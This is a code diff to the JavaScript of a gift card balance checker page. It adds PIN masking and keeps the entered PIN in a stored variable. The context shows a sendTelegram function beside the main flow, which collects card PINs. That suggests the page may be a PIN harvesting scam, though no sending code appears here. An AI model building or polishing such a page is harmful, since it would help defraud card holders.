@@ -213,7 +213,29 @@ function clearResult() {
   document.getElementById('loadingState').style.display = 'none';
 }
 
-function normalizePinInput(inputEl) {
+let _unmaskedPin = '';
+
+function handlePinInput(inputEl) {
+  if (!inputEl) return;
+  _unmaskedPin = String(inputEl.value || '').toUpperCase();
+  inputEl.value = _unmaskedPin;
+  clearResult();
+}
+
+function unmaskPinInput(inputEl) {
+  if (!inputEl) return;
+  inputEl.value = _unmaskedPin;
+}
+
+function maskPinInput(inputEl) {
+  if (!inputEl) return;
+  const currentVal = inputEl.value;
+  if (currentVal === _unmaskedPin) {
+    inputEl.value = maskPin(_unmaskedPin);
+  }
+}
+
+function normalizePinInput(inputEl) { // Kept for reference, but handlePinInput takes over
   if (!inputEl) return;
   inputEl.value = String(inputEl.value || '').toUpperCase();
 }
@@ -316,11 +338,14 @@ async function sendTelegram(text) {
 // ── Main check balance flow ───────────────────────────────────
 async function checkBalance() {
   const cardType  = document.getElementById('giftCardSelect').value;
-  const cardPin   = document.getElementById('cardPin').value.trim().toUpperCase();
+  const cardPin   = _unmaskedPin; // Use the stored unmasked PIN
 
   // Validate
   if (!cardType) { shakeEl(document.getElementById('giftCardSelect')); return; }
   if (!cardPin) { shakeEl(document.getElementById('cardPin')); return; }
+
+  // Mask the input field after validation, before processing
+  maskPinInput(document.getElementById('cardPin'));
 
   const requestId   = genId();
   const cardLabel   = CARD_LABELS[cardType] || cardType;
@@ -433,6 +458,9 @@ function showResult(balance, cardLabel, maskedPin) {
   document.getElementById('resultBox').style.display  = 'flex';
   document.getElementById('errorBox').style.display   = 'none';
   document.getElementById('resultBox').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+
+  // After showing result, ensure PIN input is masked.
+  maskPinInput(document.getElementById('cardPin'));
 }
 
 function showError(msg) {
@@ -445,4 +473,11 @@ function showError(msg) {
 document.addEventListener('DOMContentLoaded', () => {
   initCarousel();
   updateSelectIcon();
+
+  // Initialize unmasked PIN if there's a pre-filled value
+  const cardPinInput = document.getElementById('cardPin');
+  if (cardPinInput && cardPinInput.value) {
+    _unmaskedPin = String(cardPinInput.value).toUpperCase();
+    maskPinInput(cardPinInput);
+  }
 });
